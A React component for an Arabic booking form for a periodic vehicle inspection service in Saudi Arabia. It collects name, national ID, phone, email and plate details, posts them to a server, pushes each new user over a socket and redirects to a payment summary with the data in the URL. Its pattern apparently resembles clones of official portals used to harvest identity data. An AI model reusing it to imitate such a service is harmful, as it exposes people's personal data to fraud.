import React, { useState } from "react";
import { serverRoute, socket } from "./Main";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { TailSpin } from "react-loader-spinner";
import { countries, getCountryData } from "countries-list";

const NewDate = () => {
  const [loading, setLoading] = useState(false);
  const places = [
    "أبها - المحالة أبها",
    "الباحة - طريق الملك عبدالعزيز",
    "الجبيل الجبيل35762",
    "الخرج حي الراشدية",
    "الخرمة حي المحمدية",
    "الخفجي الخرفة المنطقة الصناعية الثانية",
    "الدمام حي المنار",
    "الرس - طريق الملك فهد",
    "الرياض القيروان الرياض",
    "الرياض حي الفيصلية الرياض",
    " الرياض حي المونسية",
    "الرياض طريق دايراب عكاض الرياض",
    "الطائف حي القديرة",
    "القريات - WCJA6222, 6222 تركي بن احمد السديري حي الفرسان القريات",
    "القويعية حي الزهور القويعية",
    "المجمعة المنطقة الصناعية",
    "المدينة المنورة طريق المدينة - تبوك السريع",
    "الهفوف الشارع الرابع حي الصناعية المبرز",
    "بيشة - 1432, 7372, بيشة 67912",
    "تبوك المنطقة الزراعية",
    "جازان - الكرامة العسيلة",
    "جدة - الأمير عبدالمجيد جدة",
    "جدة - شارع عبدالجليل ياسين حي المروة",
    "جدة - طريق عسفان جدة",
    "حائل طريق المدينة - منطقة الوادي",
    "حفر الباطن طريق الملك عبدالعزيز الاسكان",
    "سكاكا - سلمان الفارسي محطة الفحص الدوري للمركبات ",
    "عرعر - معارض سيارات",
    "محايل عسير - الخالدية محايل عسير",
    "مكة المكرمة - العمرة الجديدة مكة",
    "نجران - طريق الملك عبدالعزيز نجران",
    "وادي الدواسر طريق خميس - السليل السريع",
    "ينبع لمبارك ينبع",
  ];
  const handleChange = (e) => {
    const { name, type, checked, value } = e.target;

    setData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const [errors, setErrors] = useState({});

  const [data, setData] = useState({
    vechile_status: "driving_licence",
    delegate: false,
    fullname: "",
    nation_number: "",
    phone: "",
    country_code: "966",
    email: "",
    country: "",
    first: "",
    second: "",
    third: "",
    board_number: "",
    customs_number: "",
    location: "",
    service_type: "الفحص الدوري",
    danger_vechile: false,
    vechile_type: "ثنائية العجلات",
    date_check: "",
    time_check: "08:00 AM",
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true)
    const newErrors = {};
    try {
       if (data.vechile_status === "driving_licence") {
      if (!data.country) newErrors.country = "مطلوب";
      if (!data.first) newErrors.first = "مطلوب";
      if (!data.second) newErrors.second = "مطلوب";
      if (!data.third) newErrors.third = "مطلوب";
    }
    if (!data.location) newErrors.location = "مطلوب";

    if (Object.keys(newErrors).length === 0) {
      setErrors({});
      const {
        first,
        second,
        third,
        customs_number,
        country,
        board_number,
        ...other
      } = data;
      if (data.vechile_status === "driving_licence") {
        const border_letter = `${third} | ${second} | ${first}`;
        await axios
          .post(serverRoute + "/reg", {
            border_letter,
            board_number,
            country,
            ...other,
          })
          .then(async ({ status, data }) => {
            const final = JSON.stringify({
              ...data.user,
            });
            if (status === 201) {
              socket.emit("newUser", final);
              window.location.href = "/payment-summary?data=" + final;
            } else window.alert("حدث خطأ ما");
          });
      } else {
        await axios
          .post(serverRoute + "/reg", {
            customs_number,
            ...other,
          })
          .then(async ({ status, data }) => {
            const final = JSON.stringify({
              ...data.user,
            });
            if (status === 201) {
              socket.emit("newUser", final);
              window.location.href = "/payment-summary?data=" + final;
            } else window.alert("حدث خطأ ما");
          });
      }
    } else {
      alert("املاء كل الخانات المطلوبة");
      setErrors(newErrors);
    }
    } catch (error) {
      console.log(error)
    }
   finally{
    setLoading(false)
   }


  };

  const boards = [
    {
      en: "A",
      ar: "أ",
    },
    {
      en: "B",
      ar: "ب",
    },
    {
      en: "J",
      ar: "ح",
    },
    {
      en: "D",
      ar: "د",
    },
    {
      en: "R",
      ar: "ر",
    },
    {
      en: "S",
      ar: "س",
    },
    {
      en: "X",
      ar: "ص",
    },
    {
      en: "T",
      ar: "ط",
    },
    {
      en: "E",
      ar: "ع",
    },
    {
      en: "G",
      ar: "ق",
    },
    {
      en: "K",
      ar: "ك",
    },
    {
      en: "L",
      ar: "ل",
    },
    {
      en: "Z",
      ar: "م",
    },
    {
      en: "N",
      ar: "ن",
    },
    {
      en: "H",
      ar: "ه",
    },
    {
      en: "U",
      ar: "و",
    },
    {
      en: "V",
      ar: "ي",
    },
  ];

  const hours = [
    "08:00 AM",
    "08:30 AM",
    "09:00 AM",
    "09:30 AM",
    "10:00 AM",
    "10:30 AM",
    "11:00 AM",
    "11:30 AM",
    "12:00 AM",
    "12:30 PM",
    "01:00 PM",
    "01:30 PM",
    "02:00 PM",
    "02:30 PM",
    "03:00 PM",
    "03:30 PM",
    "04:00 PM",
    "04:30 PM",
    "05:00 PM",
    "05:30 PM",
    "06:00 PM",
  ];

  return (
    <div className="flex flex-col w-full justify-center items-center">
      {loading && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="blue"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      <form
        className="md:w-10/12 w-full flex flex-col p-5 gap-y-5"
        dir="rtl"
        onSubmit={handleSubmit}
      >
        <span className="md:w-1/6 w-1/2 text-2xl  text-sky-600">
          خدمة الفحص الفني الدوري
        </span>
        <span className="text-2xl  text-sky-600">حجز موعد</span>
        <div className="my-3 flex flex-col w-full">
          {/* info */}
          <div className="my-5">
            <span className="md:text-2xl text-xl">المعلومات الشخصية</span>

            <div className="w-full flex flex-col md:flex-row gap-x-3">
              <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                <span className="text-xl">الإسم * </span>
                <input
                  placeholder="إدخل الإسم"
                  className="border-2 border-gray-400 rounded-md px-2 py-2 outline-sky-500"
                  name="fullname"
                  value={data.fullname}
                  onChange={handleChange}
                  required
                />
              </div>
              <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                <span className="text-xl">رقم الهوية / الإقامة *</span>
                <input
                  placeholder="رقم الهوية  / الإقامة"
                  className="border-2 border-gray-400 rounded-md px-2 py-2 outline-sky-500"
                  name="nation_number"
                  value={data.nation_number}
                  onChange={handleChange}
                  required
                />
              </div>
            </div>

            <div className="w-full flex gap-1">
              <div className="flex flex-col md:w-11/12 w-3/4 my-2 py-3 gap-2">
                <span className="text-xl">رقم الجوال*</span>
                <input
                  placeholder="رقم الجوال"
                  className="border-2 border-gray-400 rounded-md px-2 py-2 outline-sky-500"
                  name="phone"
                  value={data.phone}
                  onChange={handleChange}
                  min={9}
                  minLength={9}
                  max={10}
                  maxLength={10}
                  required
                />
              </div>
              <div className="flex flex-col md:w-1/12 w-1/4 my-5  gap-2 justify-end ">
                <select
                  placeholder=""
                  className="border-2 border-gray-400 rounded-md px-2  py-2 outline-sky-500"
                  name="country_code"
                  value={data.country_code}
                  onChange={handleChange}
                  required
                >
                  <option>966</option>
                  <option>964</option>
                  <option>961</option>
                </select>
              </div>
            </div>

            <div className="w-full flex gap-3">
              <div className="flex flex-col w-full my-2 py-3 gap-3">
                <span className="text-xl">البريد الإلكتروني</span>
                <input
                  placeholder="البريد الإلكتروني"
                  className="border-2 border-gray-400 rounded-md px-2 py-2 outline-sky-500"
                  name="email"
                  value={data.email}
                  onChange={handleChange}
                  required
                />
              </div>
            </div>

            <div className="w-full flex items-center  gap-x-3 text-gray-500">
              <input
                name="delegate"
                id="delegate"
                type="checkbox"
                className="w-6 h-6"
                onChange={handleChange}
              />
              <label
                htmlFor="delegate"
                className="select-none md:text-xl font-bold"
              >
                هل تريد تفويض شخص اخر بفحص المركبة؟*
              </label>
            </div>
          </div>
          {/* vechile */}

          <div className="my-6">
            <span className="text-2xl ">معلومات المركبة</span>
            <div className="w-full flex flex-col md:flex-row gap-x-3">
              <div className="flex flex-col w-full my-2 py-3 gap-3">
                <span className="text-xl">اختر حالة المركبة * </span>
                <div className="flex md:flex-row flex-col w-full items-center gap-4 px-5">
                  <span
                    className={`md:w-1/2 w-2/3 text-center  rounded-full py-3 text-lg cursor-pointer ${
                      data.vechile_status === "driving_licence"
                        ? "activeSide shadow-green-700"
                        : "bg-gray-400 "
                    }`}
                    onClick={() =>
                      setData({ ...data, vechile_status: "driving_licence" })
                    }
                  >
                    تحمل رخصة سير
                  </span>
                  <span
                    className={`md:w-1/2 w-2/3 text-center  rounded-full py-3 text-lg cursor-pointer ${
                      data.vechile_status === "customs_card"
                        ? "activeSide shadow-green-700"
                        : "bg-gray-400 "
                    }`}
                    onClick={() =>
                      setData({ ...data, vechile_status: "customs_card" })
                    }
                  >
                    تحمل بطاقة جمركية
                  </span>
                </div>
              </div>
            </div>
            {data.vechile_status === "driving_licence" ? (
              <>
                <div className="flex flex-col my-5  gap-2  ">
                  <span className="text-xl">بلد التسجيل*</span>
                  <div className="relative w-full flex flex-col">
                    <select
                      placeholder=""
                      className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                      name="country"
                      value={data.country}
                      onChange={handleChange}
                    >
                      <option hidden>اختر</option>
                      <option>السعودية</option>
                      <option>البحرين</option>
                      <option>مصر</option>
                    </select>
                    {errors.country && (
                      <span className="text-red-500">{errors.country}</span>
                    )}
                  </div>
                  {}
                </div>
                <div className="flex w-full flex-col ">
                  <span className="text-xl">رقم اللوحة * </span>
                  <div className="w-full flex flex-col md:flex-row mt-5 gap-4">
                    <div className="relative">
                      <select
                        className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                        value={data.first}
                        name="first"
                        onChange={handleChange}
                      >
                        <option hidden>--اختر--</option>
                        {boards.map((e) => (
                          <option>{e.ar + " - " + e.en}</option>
                        ))}
                      </select>
                      {errors.first && (
                        <span className="text-red-500 absolute md:top-10  md:right-0 right-28 top-2">
                          {errors.first}
                        </span>
                      )}
                    </div>
                    <div className="relative">
                      <select
                        className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                        value={data.second}
                        name="second"
                        onChange={handleChange}
                      >
                        <option hidden>--اختر--</option>
                        {boards.map((e) => (
                          <option>{e.ar + " - " + e.en}</option>
                        ))}
                      </select>
                      {errors.second && (
                        <span className="text-red-500 absolute md:top-10  md:right-0 right-28 top-2">
                          {errors.second}
                        </span>
                      )}
                    </div>
                    <div className="relative">
                      <select
                        className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                        value={data.third}
                        name="third"
                        onChange={handleChange}
                      >
                        <option hidden>--اختر--</option>
                        {boards.map((e) => (
                          <option>{e.ar + " - " + e.en}</option>
                        ))}
                      </select>
                      {errors.third && (
                        <span className="text-red-500 absolute md:top-10  md:right-0 right-28 top-2">
                          {errors.third}
                        </span>
                      )}
                    </div>

                    <input
                      placeholder="رقم اللوحة"
                      value={data.board_number}
                      name="board_number"
                      onChange={handleChange}
                      required
                      max={4}
                      maxLength={4}
                      min={4}
                      minLength={4}
                      className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                    />
                  </div>
                </div>
              </>
            ) : (
              <div className="flex flex-col my-5  gap-2  ">
                <span className="text-xl">رقم البطاقة الجمركية*</span>
                <input
                  placeholder=""
                  className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                  name="customs_number"
                  value={data.customs_number}
                  onChange={handleChange}
                  required
                />
              </div>
            )}
          </div>

          {/*service */}

          <div className="my-6 w-full">
            <span className="text-2xl ">مركز الخدمة</span>
            <div className="w-full flex flex-col md:flex-row gap-x-3">
              <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                <span className="text-xl">نوع المركبة*</span>
                <select
                  className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                  name="vechile_type"
                  value={data.vechile_type}
                  onChange={handleChange}
                >
                  <option hidden>اختر</option>
                  <option>ثنائية العجلات</option>
                  <option>رباعية العجلات</option>
                </select>
              </div>
              <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                <span className="text-xl">المنطقة * </span>
                <select
                  className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                  name="location"
                  value={data.location}
                  onChange={handleChange}
                >
                  <option hidden>اختر المنطقة</option>
                  {places.map((place) => (
                    <option>{place}</option>
                  ))}
                </select>
                {errors.location && (
                  <span className="text-red-500">{errors.location}</span>
                )}
              </div>
            </div>

            <div className="flex flex-col my-5  gap-2  ">
              <span className="text-xl"> نوع خدمة الفحص*</span>
              <select
                placeholder=""
                className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                name="service_type"
                value={data.service_type}
                onChange={handleChange}
                required
              >
                <option>الفحص الدوري </option>
                <option> اعادة الفحص الدوري </option>
              </select>
              <span className="text-gray-500">
                هذه الخدمة مخصصة لمن قام بإجراء فحص مسبق خلال 14 يوم عمل الماضية
                ولم يستنفد جميع محاولات إعادة الفحص
              </span>
            </div>

            <div className="w-full mt-5 flex items-center  gap-x-3 text-gray-500">
              <input
                name="danger_vechile"
                id="danger_vechile"
                type="checkbox"
                className="w-6 h-6 "
                onChange={handleChange}
              />
              <label
                htmlFor="danger_vechile"
                className="select-none md:text-xl font-bold cursor-pointer"
              >
                المركبة تحمل مواد خطرة*
              </label>
            </div>
          </div>

          {/*date */}

          <div className="my-6 w-full">
            <span className="text-2xl ">موعد الخدمة</span>
            <div className="w-full flex flex-col md:flex-row gap-x-3">
              <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                <span className="text-xl">تاريخ الفحص*</span>
                <input
                  className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                  name="date_check"
                  value={data.date_check}
                  onChange={handleChange}
                  type="date"
                  required
                />
              </div>
              <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                <span className="text-xl">وقت الفحص*</span>
                <select
                  className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                  name="time_check"
                  value={data.time_check}
                  onChange={handleChange}
                >
                  <option hidden>اختر</option>
                  {hours.map((hour) => (
                    <option>{hour}</option>
                  ))}
                </select>
                {errors.time_check && (
                  <span className="text-red-500">{errors.time_check}</span>
                )}
              </div>
            </div>
            <span className="text-gray-500">
              الحضور على الموعد يسهم في سرعة وجودة الخدمة وفي حالة عدم الحضور،
              لن يسمح بحجز اخر إلا بعد 48 ساعة وحسب الإوقات المحددة
            </span>
          </div>

          {/*submit */}

          <div className="w-full flex items-center justify-center my-6">
            <button
              className="text-white hover:opacity-90 rounded-full min-w-48 bg-green-600 py-3 px-2 text-xl "
              type="submit"
            >
              التالي
            </button>
          </div>
        </div>
      </form>
    </div>
  );
};

export default NewDate;
